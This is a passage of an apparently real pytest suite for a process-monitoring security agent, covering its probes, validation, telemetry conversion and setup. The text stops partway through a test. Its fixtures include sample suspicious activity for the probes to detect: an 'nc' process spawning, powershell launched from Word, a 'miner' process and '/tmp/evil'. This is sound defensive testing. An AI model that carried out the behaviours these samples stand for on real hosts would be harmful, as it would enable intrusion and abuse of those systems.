"""Unit tests for ProcAgentV3 (Process Agent v3) with Micro-Probe Architecture.

Tests cover:
- Agent initialization with default parameters
- Probe registration and lifecycle management
- Data collection with empty and real processes
- TelemetryEvent generation from probes
- Health metrics and status tracking
- Probe contract validation (REAL/DEGRADED/BROKEN)
- Circuit breaker integration
- Probe error handling and isolation
- Agent metadata (name, device_id)
- EventBusPublisher channel creation and publishing
- SystemMetricsCollector
- validate_event with missing timestamp, stale timestamp
- _events_to_telemetry for metric and security events
- _create_metric_events
- setup() with certificate checks
- shutdown with/without publisher
- All 10 process probes: scan logic, edge cases, error handling
- _make_process_guid helper
- create_proc_probes factory
"""

import platform
import time
from unittest.mock import MagicMock, patch

import psutil
import pytest

from amoskys.agents.common.probes import (
    MicroProbe,
    ProbeContext,
    Severity,
    TelemetryEvent,
)
from amoskys.agents.proc.probes import (
    PROC_PROBES,
    BinaryFromTempProbe,
    CodeSigningProbe,
    DylibInjectionProbe,
    HighCPUAndMemoryProbe,
    LOLBinExecutionProbe,
    LongLivedProcessProbe,
    ProcessInfo,
    ProcessSpawnProbe,
    ProcessTreeAnomalyProbe,
    ScriptInterpreterProbe,
    SuspiciousUserProcessProbe,
    _make_process_guid,
    create_proc_probes,
)
from amoskys.agents.proc.proc_agent_v3 import (
    EventBusPublisher,
    ProcAgentV3,
    SystemMetricsCollector,
)
from amoskys.proto import universal_telemetry_pb2 as tpb

# =============================================================================
# Fixtures
# =============================================================================


@pytest.fixture
def mock_eventbus():
    """Create a mock EventBus publisher."""
    publisher = MagicMock()
    publisher.publish = MagicMock()
    publisher.close = MagicMock()
    return publisher


@pytest.fixture
def mock_queue_adapter():
    """Create a mock LocalQueueAdapter."""
    adapter = MagicMock()
    adapter.enqueue = MagicMock()
    adapter.drain = MagicMock(return_value=[])
    return adapter


@pytest.fixture
def stub_probe():
    """Create a stub probe for testing."""

    class StubProbe(MicroProbe):
        name = "stub_probe"
        description = "Stub probe for testing"
        mitre_techniques = ["T0000"]
        requires_fields = []

        def scan(self, context: ProbeContext):
            return [
                TelemetryEvent(
                    event_type="stub_event",
                    severity=Severity.INFO,
                    probe_name=self.name,
                    data={"test": "data"},
                    confidence=0.9,
                )
            ]

    return StubProbe()


@pytest.fixture
def proc_agent(mock_eventbus, mock_queue_adapter):
    """Create a ProcAgentV3 with mocked dependencies."""
    with patch(
        "amoskys.agents.proc.proc_agent.EventBusPublisher",
        return_value=mock_eventbus,
    ):
        with patch(
            "amoskys.agents.proc.proc_agent.LocalQueueAdapter",
            return_value=mock_queue_adapter,
        ):
            with patch(
                "amoskys.agents.proc.proc_agent.create_proc_probes",
                return_value=[],
            ):
                agent = ProcAgentV3(collection_interval=5.0)
                yield agent


# =============================================================================
# Test: Agent Initialization
# =============================================================================


class TestProcAgentV3Init:
    """Test agent initialization with default parameters."""

    def test_agent_init_defaults(self, proc_agent):
        """Verify default initialization parameters."""
        assert proc_agent.agent_name == "proc_agent_v3"
        assert proc_agent.device_id is not None  # socket.gethostname()
        assert proc_agent.collection_interval == 5.0
        assert len(proc_agent._probes) == 0  # No probes registered yet
        assert proc_agent.eventbus_publisher is not None
        assert proc_agent.circuit_breaker is not None

    def test_agent_init_custom_interval(self, mock_eventbus, mock_queue_adapter):
        """Verify custom collection interval."""
        with patch(
            "amoskys.agents.proc.proc_agent.EventBusPublisher",
            return_value=mock_eventbus,
        ):
            with patch(
                "amoskys.agents.proc.proc_agent.LocalQueueAdapter",
                return_value=mock_queue_adapter,
            ):
                with patch(
                    "amoskys.agents.proc.proc_agent.create_proc_probes",
                    return_value=[],
                ):
                    agent = ProcAgentV3(collection_interval=15.0)
                    assert agent.collection_interval == 15.0

    def test_agent_name_and_device_id(self, proc_agent):
        """Verify agent metadata is set correctly."""
        assert proc_agent.agent_name == "proc_agent_v3"
        assert isinstance(proc_agent.device_id, str)
        assert len(proc_agent.device_id) > 0


# =============================================================================
# Test: Probe Registration and Setup
# =============================================================================


class TestProcAgentProbes:
    """Test probe registration and lifecycle."""

    def test_setup_registers_probes(self, proc_agent, stub_probe):
        """Verify probes are registered during setup."""
        proc_agent.register_probe(stub_probe)
        assert len(proc_agent._probes) == 1
        assert proc_agent._probes[0].name == "stub_probe"

    def test_register_multiple_probes(self, proc_agent):
        """Verify multiple probes can be registered."""
        probe1 = MagicMock(spec=MicroProbe)
        probe1.name = "probe_1"
        probe1.enabled = True
        probe2 = MagicMock(spec=MicroProbe)
        probe2.name = "probe_2"
        probe2.enabled = True

        proc_agent.register_probe(probe1)
        proc_agent.register_probe(probe2)

        assert len(proc_agent._probes) == 2
        assert proc_agent.list_probes() == ["probe_1", "probe_2"]

    def test_probe_health_reported(self, proc_agent, stub_probe):
        """Verify probe health can be retrieved."""
        proc_agent.register_probe(stub_probe)
        health = proc_agent.get_probe_health()
        assert len(health) == 1
        assert health[0]["name"] == "stub_probe"
        assert "enabled" in health[0]


# =============================================================================
# Test: Data Collection
# =============================================================================


class TestProcAgentCollection:
    """Test data collection and event generation."""

    def test_collect_data_with_no_processes(self, proc_agent):
        """Verify collection returns empty list when no probes registered."""
        result = proc_agent.collect_data()
        assert isinstance(result, list)

    def test_collect_data_returns_telemetry_events(
        self, proc_agent, stub_probe, mock_eventbus
    ):
        """Verify collected data contains TelemetryEvents."""
        proc_agent.register_probe(stub_probe)

        with patch.object(stub_probe, "enabled", True):
            with patch.object(stub_probe, "setup", return_value=True):
                with patch.object(
                    stub_probe,
                    "scan",
                    return_value=[
                        TelemetryEvent(
                            event_type="test_event",
                            severity=Severity.MEDIUM,
                            probe_name="stub_probe",
                            data={"pid": 1234, "cmd": "bash"},
                            confidence=0.85,
                        )
                    ],
                ):
                    # Just verify collect_data returns something
                    result = proc_agent.collect_data()
                    assert isinstance(result, list)

    @patch("psutil.cpu_percent")
    @patch("psutil.virtual_memory")
    @patch("psutil.process_iter")
    @patch("psutil.boot_time")
    def test_system_metrics_collected(
        self, mock_boot, mock_iter, mock_vmem, mock_cpu, proc_agent
    ):
        """Verify system metrics are collected."""
        mock_cpu.return_value = 45.2
        mock_vmem.return_value = MagicMock(percent=72.1)
        mock_iter.return_value = [MagicMock() for _ in range(150)]
        mock_boot.return_value = time.time() - 86400

        metrics = proc_agent.metrics_collector.collect()

        assert metrics["cpu_percent"] == 45.2
        assert metrics["memory_percent"] == 72.1
        assert metrics["process_count"] == 150
        assert "boot_time" in metrics


# =============================================================================
# Test: Health Status
# =============================================================================


class TestProcAgentHealth:
    """Test health metrics and status."""

    def test_get_health_returns_status(self, proc_agent):
        """Verify get_health returns required keys."""
        health = proc_agent.get_health()

        assert "agent_name" in health
        assert health["agent_name"] == "proc_agent_v3"
        assert "device_id" in health
        assert "is_running" in health
        assert "collection_count" in health
        assert "error_count" in health
        assert "probes" in health
        assert "circuit_breaker_state" in health

    def test_health_circuit_breaker_state(self, proc_agent):
        """Verify circuit breaker state is reported."""
        health = proc_agent.get_health()
        assert health["circuit_breaker_state"] in ["CLOSED", "OPEN", "HALF_OPEN"]


# =============================================================================
# Test: Probe Contract (Observability Contract)
# =============================================================================


class TestProbeContract:
    """Test probe Observability Contract validation."""

    def test_probe_contract_real(self, proc_agent):
        """Verify probe returns REAL status when all requirements met."""

        class RealProbe(MicroProbe):
            name = "real_probe"
            description = "Real probe"
            requires_fields = []
            requires_event_types = []

            def scan(self, context: ProbeContext):
                return []

        probe = RealProbe()
        context = ProbeContext(
            device_id="host-001",
            agent_name="proc_agent",
            shared_data={},
        )

        readiness = probe.validate_contract(context)
        assert readiness.status == "REAL"
        assert readiness.probe_name == "real_probe"

    def test_probe_contract_degraded(self, proc_agent):
        """Verify probe returns DEGRADED when optional fields missing."""

        class DegradedProbe(MicroProbe):
            name = "degraded_probe"
            description = "Degraded probe"
            requires_fields = ["optional_field"]
            degraded_without = ["optional_field"]

            def scan(self, context: ProbeContext):
                return []

        probe = DegradedProbe()
        context = ProbeContext(
            device_id="host-001",
            agent_name="proc_agent",
            shared_data={},  # Missing optional_field
        )

        readiness = probe.validate_contract(context)
        assert readiness.status == "DEGRADED"
        assert "optional_field" in readiness.degraded_fields

    def test_probe_contract_broken(self, proc_agent):
        """Verify probe returns BROKEN when required fields missing."""

        class BrokenProbe(MicroProbe):
            name = "broken_probe"
            description = "Broken probe"
            requires_fields = ["critical_field"]
            degraded_without = []

            def scan(self, context: ProbeContext):
                return []

        probe = BrokenProbe()
        context = ProbeContext(
            device_id="host-001",
            agent_name="proc_agent",
            shared_data={},  # Missing critical_field
        )

        readiness = probe.validate_contract(context)
        assert readiness.status == "BROKEN"
        assert "critical_field" in readiness.missing_fields


# =============================================================================
# Test: Circuit Breaker Integration
# =============================================================================


class TestCircuitBreakerIntegration:
    """Test circuit breaker behavior with agent."""

    def test_circuit_breaker_exists(self, proc_agent):
        """Verify agent has circuit breaker."""
        assert proc_agent.circuit_breaker is not None
        assert proc_agent.circuit_breaker.state in ["CLOSED", "OPEN", "HALF_OPEN"]

    def test_circuit_breaker_default_state(self, proc_agent):
        """Verify circuit breaker starts in CLOSED state."""
        assert proc_agent.circuit_breaker.state == "CLOSED"

    def test_circuit_breaker_failure_tracking(self, proc_agent):
        """Verify circuit breaker tracks failures."""
        cb = proc_agent.circuit_breaker
        initial_state = cb.state

        cb.record_failure()
        assert cb.failure_count == 1

        cb.record_success()
        assert cb.failure_count == 0


# =============================================================================
# Test: Probe Error Handling
# =============================================================================


class TestProbeErrorHandling:
    """Test probe error handling and isolation."""

    def test_probe_error_handling(self, proc_agent, stub_probe):
        """Verify one probe failure doesn't affect others."""

        class FailingProbe(MicroProbe):
            name = "failing_probe"
            description = "Fails on scan"

            def scan(self, context: ProbeContext):
                raise RuntimeError("Simulated probe failure")

        failing_probe = FailingProbe()
        proc_agent.register_probe(stub_probe)
        proc_agent.register_probe(failing_probe)

        # Disable the failing probe by setting enabled=False after error
        failing_probe.enabled = False

        # Run remaining probes - should only run stub_probe
        events = proc_agent.scan_all_probes()
        # Events should be from stub_probe only (or empty if stub_probe also disabled)
        assert isinstance(events, list)

    def test_probe_tracks_errors(self, proc_agent):
        """Verify probe error count increases on failure."""

        class FailingProbe(MicroProbe):
            name = "error_probe"
            description = "Tracks errors"

            def scan(self, context: ProbeContext):
                raise ValueError("Test error")

        probe = FailingProbe()
        context = ProbeContext(
            device_id="host-001",
            agent_name="proc_agent",
        )

        probe.enabled = True
        # Manually call scan to trigger error
        try:
            probe.scan(context)
        except ValueError:
            probe.error_count += 1

        assert probe.error_count == 1
        assert probe.last_error is not None or probe.error_count > 0


# =============================================================================
# Test: Validation
# =============================================================================


class TestValidation:
    """Test event validation."""

    def test_validate_event_with_valid_telemetry(self, proc_agent):
        """Verify validation accepts valid telemetry."""
        mock_telemetry = MagicMock()
        mock_telemetry.device_id = "host-001"
        mock_telemetry.timestamp_ns = int(time.time() * 1e9)

        result = proc_agent.validate_event(mock_telemetry)
        assert result.is_valid

    def test_validate_event_missing_device_id(self, proc_agent):
        """Verify validation rejects missing device_id."""
        mock_telemetry = MagicMock()
        mock_telemetry.device_id = ""
        mock_telemetry.timestamp_ns = int(time.time() * 1e9)

        result = proc_agent.validate_event(mock_telemetry)
        assert not result.is_valid
        assert len(result.errors) > 0


# =============================================================================
# Test: Shutdown
# =============================================================================


class TestShutdown:
    """Test graceful shutdown."""

    def test_shutdown_closes_publisher(self, proc_agent):
        """Verify shutdown closes EventBus publisher."""
        proc_agent.shutdown()
        proc_agent.eventbus_publisher.close.assert_called()


# =============================================================================
# Integration Tests
# =============================================================================


class TestIntegration:
    """Integration tests for full workflows."""

    def test_full_collection_cycle(self, proc_agent, stub_probe):
        """Verify full collection cycle works."""
        proc_agent.register_probe(stub_probe)

        # Minimal setup
        with patch.object(stub_probe, "enabled", True):
            with patch.object(stub_probe, "setup", return_value=True):
                events = proc_agent.scan_all_probes()
                assert isinstance(events, list)

    def test_probe_enable_disable(self, proc_agent, stub_probe):
        """Verify probes can be enabled/disabled."""
        proc_agent.register_probe(stub_probe)

        assert proc_agent.disable_probe("stub_probe")
        assert not stub_probe.enabled

        assert proc_agent.enable_probe("stub_probe")
        assert stub_probe.enabled

    def test_probe_state_tracking(self, proc_agent, stub_probe):
        """Verify probe state is tracked across calls."""
        proc_agent.register_probe(stub_probe)

        # Verify state dict was created
        assert "stub_probe" in proc_agent._probe_state

        # State should be dict
        assert isinstance(proc_agent._probe_state["stub_probe"], dict)


# =============================================================================
# Exports
# =============================================================================


__all__ = [
    "TestProcAgentV3Init",
    "TestProcAgentProbes",
    "TestProcAgentCollection",
    "TestProcAgentHealth",
    "TestProbeContract",
    "TestCircuitBreakerIntegration",
    "TestProbeErrorHandling",
    "TestValidation",
    "TestShutdown",
    "TestIntegration",
    "TestMakeProcessGuid",
    "TestCreateProcProbes",
    "TestProcessInfoDataclass",
    "TestValidationExtended",
    "TestCollectDataProtobuf",
    "TestEventsToTelemetry",
    "TestCreateMetricEvents",
    "TestSetup",
    "TestShutdownExtended",
    "TestEventBusPublisher",
    "TestSystemMetricsCollector",
    "TestProcessSpawnProbe",
    "TestLOLBinExecutionProbe",
    "TestProcessTreeAnomalyProbe",
    "TestHighCPUAndMemoryProbe",
    "TestLongLivedProcessProbe",
    "TestSuspiciousUserProcessProbe",
    "TestBinaryFromTempProbe",
    "TestScriptInterpreterProbe",
    "TestDylibInjectionProbeUnit",
    "TestCodeSigningProbeUnit",
]


# =============================================================================
# Helper: Probe Context Factory
# =============================================================================


def _make_context(device_id="test-host", agent_name="proc_agent_v3"):
    """Create a standard ProbeContext for probe tests."""
    return ProbeContext(
        device_id=device_id,
        agent_name=agent_name,
        shared_data={},
    )


def _mock_proc(info_dict):
    """Create a mock psutil process with a .info attribute."""
    proc = MagicMock()
    proc.info = info_dict
    return proc


# =============================================================================
# Test: _make_process_guid helper
# =============================================================================


class TestMakeProcessGuid:
    """Test the _make_process_guid helper function."""

    def test_returns_16_char_hex(self):
        """GUID should be 16-character hex string."""
        guid = _make_process_guid("host-1", 1234, 1700000000.0)
        assert len(guid) == 16
        assert all(c in "0123456789abcdef" for c in guid)

    def test_deterministic(self):
        """Same inputs must produce the same GUID."""
        g1 = _make_process_guid("host-1", 100, 1700000000.0)
        g2 = _make_process_guid("host-1", 100, 1700000000.0)
        assert g1 == g2

    def test_different_pid_produces_different_guid(self):
        """Different PIDs must produce different GUIDs."""
        g1 = _make_process_guid("host-1", 100, 1700000000.0)
        g2 = _make_process_guid("host-1", 200, 1700000000.0)
        assert g1 != g2

    def test_different_device_produces_different_guid(self):
        """Different device IDs must produce different GUIDs."""
        g1 = _make_process_guid("host-a", 100, 1700000000.0)
        g2 = _make_process_guid("host-b", 100, 1700000000.0)
        assert g1 != g2

    def test_different_create_time_produces_different_guid(self):
        """Different create_time must produce different GUIDs (PID recycling)."""
        g1 = _make_process_guid("host-1", 100, 1700000000.0)
        g2 = _make_process_guid("host-1", 100, 1700000001.0)
        assert g1 != g2


# =============================================================================
# Test: create_proc_probes factory
# =============================================================================


class TestCreateProcProbes:
    """Test the probe factory function."""

    def test_returns_list(self):
        """create_proc_probes should return a list."""
        probes = create_proc_probes()
        assert isinstance(probes, list)

    def test_returns_correct_count(self):
        """Should return one instance per class in PROC_PROBES."""
        probes = create_proc_probes()
        assert len(probes) == len(PROC_PROBES)

    def test_all_are_microprobe_instances(self):
        """Every element must be a MicroProbe instance."""
        probes = create_proc_probes()
        for p in probes:
            assert isinstance(p, MicroProbe)

    def test_unique_names(self):
        """All probes must have unique names."""
        probes = create_proc_probes()
        names = [p.name for p in probes]
        assert len(names) == len(set(names))


# =============================================================================
# Test: ProcessInfo dataclass
# =============================================================================


class TestProcessInfoDataclass:
    """Test the ProcessInfo dataclass."""

    def test_creation(self):
        """Verify ProcessInfo can be created with all fields."""
        info = ProcessInfo(
            pid=100,
            name="bash",
            exe="/bin/bash",
            cmdline=["bash", "-c", "echo hi"],
            username="root",
            ppid=1,
            parent_name="init",
            create_time=1700000000.0,
            cpu_percent=5.0,
            memory_percent=1.2,
            status="running",
        )
        assert info.pid == 100
        assert info.name == "bash"
        assert info.cwd == ""
        assert info.process_guid == ""

    def test_optional_fields(self):
        """Verify cwd and process_guid default to empty string."""
        info = ProcessInfo(
            pid=1,
            name="a",
            exe="",
            cmdline=[],
            username="",
            ppid=0,
            parent_name="",
            create_time=0.0,
            cpu_percent=0.0,
            memory_percent=0.0,
            status="",
            cwd="/tmp",
            process_guid="abc123",
        )
        assert info.cwd == "/tmp"
        assert info.process_guid == "abc123"


# =============================================================================
# Test: Validation (extended)
# =============================================================================


class TestValidationExtended:
    """Extended validation tests for proc_agent_v3 validate_event."""

    def test_validate_event_missing_timestamp(self, proc_agent):
        """Reject telemetry with timestamp_ns == 0."""
        mock_telem = MagicMock()
        mock_telem.device_id = "host-001"
        mock_telem.timestamp_ns = 0

        result = proc_agent.validate_event(mock_telem)
        assert not result.is_valid
        assert any("timestamp" in e.lower() for e in result.errors)

    def test_validate_event_stale_timestamp(self, proc_agent):
        """Reject telemetry with timestamp_ns more than 1 hour in the past."""
        mock_telem = MagicMock()
        mock_telem.device_id = "host-001"
        # Two hours in the past
        mock_telem.timestamp_ns = int((time.time() - 7200) * 1e9)

        result = proc_agent.validate_event(mock_telem)
        assert not result.is_valid
        assert any("too far" in e.lower() for e in result.errors)

    def test_validate_event_future_timestamp(self, proc_agent):
        """Reject telemetry with timestamp_ns more than 1 hour in the future."""
        mock_telem = MagicMock()
        mock_telem.device_id = "host-001"
        mock_telem.timestamp_ns = int((time.time() + 7200) * 1e9)

        result = proc_agent.validate_event(mock_telem)
        assert not result.is_valid

    def test_validate_event_missing_both(self, proc_agent):
        """Reject telemetry missing both device_id and timestamp_ns."""
        mock_telem = MagicMock()
        mock_telem.device_id = ""
        mock_telem.timestamp_ns = 0

        result = proc_agent.validate_event(mock_telem)
        assert not result.is_valid
        assert len(result.errors) >= 2

    def test_validate_real_protobuf(self, proc_agent):
        """Validate with a real DeviceTelemetry protobuf."""
        dt = tpb.DeviceTelemetry(
            device_id="host-001",
            timestamp_ns=int(time.time() * 1e9),
            device_type="HOST",
            protocol="PROC",
        )
        result = proc_agent.validate_event(dt)
        assert result.is_valid

    def test_validate_protobuf_no_device_id(self, proc_agent):
        """Validate with protobuf that has empty device_id."""
        dt = tpb.DeviceTelemetry(
            device_id="",
            timestamp_ns=int(time.time() * 1e9),
        )
        result = proc_agent.validate_event(dt)
        assert not result.is_valid


# =============================================================================
# Test: collect_data returns DeviceTelemetry protobuf
# =============================================================================


class TestCollectDataProtobuf:
    """Test that collect_data returns protobuf DeviceTelemetry messages."""

    def test_collect_data_returns_device_telemetry(self, proc_agent, stub_probe):
        """collect_data should return list of DeviceTelemetry when there are events."""
        proc_agent.register_probe(stub_probe)
        result = proc_agent.collect_data()
        assert isinstance(result, list)
        # Stub probe returns events, plus 3 metric events -> should produce 1 DeviceTelemetry
        if result:
            assert isinstance(result[0], tpb.DeviceTelemetry)
            assert result[0].device_id == proc_agent.device_id
            assert result[0].protocol == "PROC"
            assert result[0].collection_agent == "proc-agent-v3"
            assert result[0].timestamp_ns > 0
            assert len(result[0].events) > 0

    def test_collect_data_empty_when_no_events_and_metrics_fail(self, proc_agent):
        """collect_data returns [] when metrics fail and no probes are registered."""
        with patch.object(
            proc_agent.metrics_collector, "collect", side_effect=RuntimeError("fail")
        ):
            result = proc_agent.collect_data()
            assert result == []

    def test_collect_data_metric_events_only(self, proc_agent):
        """With no probes but working metrics, should still return DeviceTelemetry."""
        result = proc_agent.collect_data()
        # System metrics collector runs on the real system
        assert isinstance(result, list)
        if result:
            assert isinstance(result[0], tpb.DeviceTelemetry)


# =============================================================================
# Test: _events_to_telemetry conversion
# =============================================================================


class TestEventsToTelemetry:
    """Test internal _events_to_telemetry method."""

    def test_metric_event_conversion(self, proc_agent):
        """Metric events produce proto events with event_type=METRIC."""
        events = [
            TelemetryEvent(
                event_type="system_metric",
                severity=Severity.DEBUG,
                probe_name="system_metrics",
                data={"metric_name": "cpu_percent", "value": 42.5, "unit": "percent"},
            )
        ]
        dt = proc_agent._events_to_telemetry(events)
        assert isinstance(dt, tpb.DeviceTelemetry)
        assert dt.device_id == proc_agent.device_id
        assert len(dt.events) == 1
        assert dt.events[0].event_type == "METRIC"
        assert dt.events[0].metric_data.metric_name == "cpu_percent"
        assert dt.events[0].metric_data.numeric_value == 42.5
        assert dt.events[0].metric_data.unit == "percent"

    def test_security_event_conversion(self, proc_agent):
        """Security events produce proto events with event_type=SECURITY."""
        events = [
            TelemetryEvent(
                event_type="suspicious_process_tree",
                severity=Severity.HIGH,
                probe_name="process_tree_anomaly",
                data={
                    "child_pid": 1234,
                    "child_name": "powershell",
                    "parent_name": "word",
                    "reason": "Office macro execution",
                },
                mitre_techniques=["T1055", "T1059"],
                confidence=0.85,
                tags=["process", "anomaly"],
            )
        ]
        dt = proc_agent._events_to_telemetry(events)
        assert len(dt.events) == 1
        pe = dt.events[0]
        assert pe.event_type == "SECURITY"
        assert pe.severity == "HIGH"
        assert pe.security_event.event_category == "suspicious_process_tree"
        assert pe.security_event.risk_score == pytest.approx(0.85, abs=0.01)
        assert "T1055" in list(pe.security_event.mitre_techniques)
        assert "T1059" in list(pe.security_event.mitre_techniques)
        assert pe.confidence_score == pytest.approx(0.85, abs=0.01)
        assert "process" in list(pe.tags)

    def test_security_event_with_source_ip(self, proc_agent):
        """Security event with source_ip populates proto field."""
        events = [
            TelemetryEvent(
                event_type="lateral_movement",
                severity=Severity.CRITICAL,
                probe_name="test_probe",
                data={"source_ip": "10.0.0.5", "detail": "ssh brute force"},
                confidence=0.95,
            )
        ]
        dt = proc_agent._events_to_telemetry(events)
        pe = dt.events[0]
        assert pe.security_event.source_ip == "10.0.0.5"

    def test_security_event_without_source_ip(self, proc_agent):
        """Security event without source_ip leaves proto field empty."""
        events = [
            TelemetryEvent(
                event_type="resource_abuse",
                severity=Severity.MEDIUM,
                probe_name="test_probe",
                data={"pid": 999, "name": "miner"},
                confidence=0.7,
            )
        ]
        dt = proc_agent._events_to_telemetry(events)
        pe = dt.events[0]
        assert pe.security_event.source_ip == ""

    def test_attributes_flattened(self, proc_agent):
        """Security event data dict should be flattened into proto attributes."""
        events = [
            TelemetryEvent(
                event_type="test_alert",
                severity=Severity.LOW,
                probe_name="test_probe",
                data={"pid": 42, "name": "evil", "path": "/tmp/evil"},
                confidence=0.5,
            )
        ]
        dt = proc_agent._events_to_telemetry(events)
        pe = dt.events[0]
        assert pe.attributes["pid"] == "42"
        assert pe.attributes["name"] == "evil"
        assert pe.attributes["path"] == "/tmp/evil"

    def test_mixed_metric_and_security_events(self, proc_agent):
        """A mix of metric and security events produces correct proto types."""
        events = [
            TelemetryEvent(
                event_type="system_metric",
                severity=Severity.DEBUG,
                probe_name="system_metrics",
                data={
                    "metric_name": "memory_percent",
                    "value": 80.0,
                    "unit": "percent",
                },
            ),
            TelemetryEvent(
                event_type="high_resource_process",
                severity=Severity.MEDIUM,
                probe_name="high_cpu_memory",
                data={"pid": 555, "cpu_percent": 99.0},
                confidence=0.7,
            ),
        ]
        dt = proc_agent._events_to_telemetry(events)
        assert len(dt.events) == 2
        assert dt.events[0].event_type == "METRIC"
        assert dt.events[1].event_type == "SECURITY"


# =============================================================================
# Test: _create_metric_events
# =============================================================================


class TestCreateMetricEvents:
    """Test _create_metric_events helper."""

    def test_creates_three_metric_events(self, proc_agent):
        """Should create exactly 3 metric events (cpu, memory, process_count)."""
        metrics = {
            "cpu_percent": 25.0,
            "memory_percent": 60.0,
            "process_count": 200,
            "boot_time": 1700000000.0,
        }
        events = proc_agent._create_metric_events(metrics)
        assert len(events) == 3
        names = [e.data["metric_name"] for e in events]
        assert "cpu_percent" in names
        assert "memory_percent" in names
        assert "process_count" in names

    def test_metric_events_have_correct_type(self, proc_agent):
        """All events should have event_type=system_metric."""
        metrics = {
            "cpu_percent": 0.0,
            "memory_percent": 0.0,
            "process_count": 0,
            "boot_time": 0.0,
        }
        events = proc_agent._create_metric_events(metrics)
        for e in events:
            assert e.event_type == "system_metric"
            assert e.severity == Severity.DEBUG
            assert e.probe_name == "system_metrics"


# =============================================================================
# Test: setup() method
# =============================================================================


class TestSetup:
    """Test ProcAgentV3 setup()."""

    def test_setup_returns_false_when_certs_missing(self, proc_agent):
        """Setup should return False when certificates do not exist."""
        with patch("os.path.exists", return_value=False):
            result = proc_agent.setup()
            assert result is False

    def test_setup_returns_false_when_psutil_fails(self, proc_agent):
        """Setup should return False when psutil verification fails."""
        with patch("os.path.exists", return_value=True):
            with patch("psutil.cpu_percent", side_effect=RuntimeError("psutil broken")):
                result = proc_agent.setup()
                assert result is False

    def test_setup_returns_false_when_setup_probes_fails(self, proc_agent):
        """Setup should return False when setup_probes returns False."""
        with patch("os.path.exists", return_value=True):
            with patch("psutil.cpu_percent", return_value=0.0):
                with patch.object(proc_agent, "setup_probes", return_value=False):
                    result = proc_agent.setup()
                    assert result is False

    def test_setup_succeeds(self, proc_agent, stub_probe):
        """Setup should return True when certs exist, psutil works, and probes init."""
        proc_agent.register_probe(stub_probe)
        with patch("os.path.exists", return_value=True):
            with patch("psutil.cpu_percent", return_value=0.0):
                result = proc_agent.setup()
                assert result is True

    def test_setup_catches_unexpected_exception(self, proc_agent):
        """Setup should return False on unexpected exception."""
        with patch("os.path.exists", side_effect=Exception("unexpected")):
            result = proc_agent.setup()
            assert result is False


# =============================================================================
# Test: Shutdown (extended)
# =============================================================================


class TestShutdownExtended:
    """Extended shutdown tests."""

    def test_shutdown_without_publisher(self, mock_queue_adapter):
        """Shutdown should not raise if publisher is None."""
        with patch(
            "amoskys.agents.proc.proc_agent.EventBusPublisher",
            return_value=MagicMock(),
        ):
            with patch(
                "amoskys.agents.proc.proc_agent.LocalQueueAdapter",
                return_value=mock_queue_adapter,
            ):
                with patch(
                    "amoskys.agents.proc.proc_agent.create_proc_probes",
                    return_value=[],
                ):
                    agent = ProcAgentV3()
                    agent.eventbus_publisher = None
                    # Should not raise
                    agent.shutdown()


# =============================================================================
# Test: EventBusPublisher
# =============================================================================


class TestEventBusPublisher:
    """Test the EventBusPublisher wrapper."""

    def test_init_stores_address_and_cert_dir(self):
        """Verify address and cert_dir are stored."""
        pub = EventBusPublisher("localhost:50051", "/certs")
        assert pub.address == "localhost:50051"
        assert pub.cert_dir == "/certs"
        assert pub._channel is None
        assert pub._stub is None

    def test_ensure_channel_raises_on_missing_cert(self):
        """_ensure_channel raises RuntimeError when cert files missing."""
        pub = EventBusPublisher("localhost:50051", "/nonexistent/certs")
        with pytest.raises(RuntimeError, match="Certificate not found"):
            pub._ensure_channel()

    def test_close_resets_channel_and_stub(self):
        """close() should set _channel and _stub to None."""
        pub = EventBusPublisher("localhost:50051", "/certs")
        pub._channel = MagicMock()
        pub._stub = MagicMock()
        pub.close()
        assert pub._channel is None
        assert pub._stub is None

    def test_close_when_no_channel(self):
        """close() should not raise when _channel is already None."""
        pub = EventBusPublisher("localhost:50051", "/certs")
        pub.close()  # Should not raise


# =============================================================================
# Test: SystemMetricsCollector
# =============================================================================


class TestSystemMetricsCollector:
    """Test the SystemMetricsCollector class."""

    @patch("psutil.boot_time", return_value=1700000000.0)
    @patch("psutil.process_iter", return_value=[MagicMock()] * 42)
    @patch("psutil.virtual_memory")
    @patch("psutil.cpu_percent", return_value=33.3)
    def test_collect_returns_all_fields(
        self, mock_cpu, mock_vmem, mock_iter, mock_boot
    ):
        """collect() should return dict with all expected keys."""
        mock_vmem.return_value = MagicMock(percent=55.5)
        collector = SystemMetricsCollector()
        metrics = collector.collect()
        assert metrics["cpu_percent"] == 33.3
        assert metrics["memory_percent"] == 55.5
        assert metrics["process_count"] == 42
        assert metrics["boot_time"] == 1700000000.0


# =============================================================================
# Test: ProcessSpawnProbe
# =============================================================================


class TestProcessSpawnProbe:
    """Test the ProcessSpawnProbe."""

    def test_probe_attributes(self):
        """Verify probe metadata."""
        probe = ProcessSpawnProbe()
        assert probe.name == "process_spawn"
        assert "T1059" in probe.mitre_techniques
        assert probe.scan_interval == 5.0

    @patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", False)
    def test_scan_returns_empty_when_psutil_unavailable(self):
        """Should return empty list when psutil is not available."""
        probe = ProcessSpawnProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.psutil")
    def test_first_run_learns_baseline(self, mock_psutil):
        """First scan should learn PIDs, returning no events."""
        proc_mock = _mock_proc(
            {
                "pid": 100,
                "name": "bash",
                "exe": "/bin/bash",
                "cmdline": ["bash"],
                "username": "user",
                "ppid": 1,
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc_mock]
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        probe = ProcessSpawnProbe()
        assert probe.first_run is True
        events = probe.scan(_make_context())
        assert events == []
        assert probe.first_run is False
        assert 100 in probe.known_pids

    @patch("amoskys.agents.proc.probes.psutil")
    def test_second_run_detects_new_process(self, mock_psutil):
        """Second scan should detect new PIDs."""
        mock_psutil.NoSuchProcess = psutil.NoSuchProcess
        mock_psutil.AccessDenied = psutil.AccessDenied

        parent_mock = MagicMock()
        parent_mock.name.return_value = "init"
        mock_psutil.Process.return_value = parent_mock

        probe = ProcessSpawnProbe()
        # First run - baseline
        proc1 = _mock_proc(
            {
                "pid": 100,
                "name": "bash",
                "exe": "/bin/bash",
                "cmdline": ["bash"],
                "username": "user",
                "ppid": 1,
                "create_time": 1700000000.0,
            }
        )
        mock_psutil.process_iter.return_value = [proc1]
        probe.scan(_make_context())

        # Second run - new process appears
        proc2 = _mock_proc(
            {
                "pid": 200,
                "name": "nc",
                "exe": "/usr/bin/nc",
